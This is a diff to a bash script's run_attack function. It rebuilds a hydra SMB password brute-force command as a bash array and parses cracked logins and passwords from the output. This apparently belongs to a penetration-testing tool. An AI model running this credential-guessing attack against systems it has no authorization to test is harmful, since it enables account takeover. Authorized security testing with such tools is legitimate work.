@@ -89,11 +89,13 @@ run_attack() {
     log_info "Timeout: ${TIMEOUT}s"
     echo ""
     
-    # Run hydra
-    local hydra_opts="-L $username_file -P $wordlist -t $THREADS -w $TIMEOUT -f"
-    [ -n "$DOMAIN" ] && hydra_opts="$hydra_opts -m \"$DOMAIN\""
+    # Run hydra with array-based command construction
+    local hydra_cmd=(hydra -L "$username_file" -P "$wordlist" -t "$THREADS" -w "$TIMEOUT" -f)
+    if [ -n "$DOMAIN" ]; then
+        hydra_cmd+=(-m "$DOMAIN")
+    fi
     
-    hydra $hydra_opts smb://$TARGET:$PORT 2>&1 | while IFS= read -r line; do
+    "${hydra_cmd[@]}" "smb://$TARGET:$PORT" 2>&1 | while IFS= read -r line; do
         if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
             local login=$(echo "$line" | grep -oP 'login: \K[^ ]+')
             local password=$(echo "$line" | grep -oP 'password: \K[^ ]+')
